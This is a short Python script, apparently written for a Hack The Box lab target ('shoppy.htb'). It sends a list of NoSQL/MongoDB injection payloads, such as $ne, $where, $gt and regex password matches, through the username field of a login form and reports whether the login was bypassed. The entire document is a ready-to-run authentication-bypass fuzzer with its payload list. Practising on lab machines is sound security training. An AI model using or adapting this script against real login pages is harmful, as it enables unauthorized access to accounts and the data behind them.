#!/usr/bin/env python3
# Author: Deity_Link1478
# Description: Script to fuzz SQL and NoSQL injection 
# Date: 22.09.22
import requests

url = 'http://shoppy.htb/login'         #Change this variable based on URL 
headers = {'content-type': 'application/json'}

nosql_list = ("||'1==1", "true, $where: '1 == 1'" ,", $where: '1 == 1'", "$where: '1 == 1'", "', $where: '1 == 1'", "1, $where: '1 == 1'", "{ $ne: 1 }", "', $or: [ {}, { 'a':'a", "' } ], $comment:'successful MongoDB injection'", "db.injection.insert({success:1});", "db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1", "|| 1==1", "' && this.password.match(/.*/)//+%00", "' && this.passwordzz.match(/.*/)//+%00", "'%20%26%26%20this.password.match(/.*/)//+%00", "'%20%26%26%20this.passwordzz.match(/.*/)//+%00", "{$gt: ''}", "[$ne]=1)" )

for x in nosql_list:
        user = {'username': "admin'%s" % x,
                'password': 'fake'}
        inject = "'||'1==1"
        payload = user
        
        r = requests.post(url=url, json=payload, headers=headers, timeout=3)
        
        if r.status_code == 200:
                print('Login Bypassed!')
        else:
                print('Login Not Bypassed')
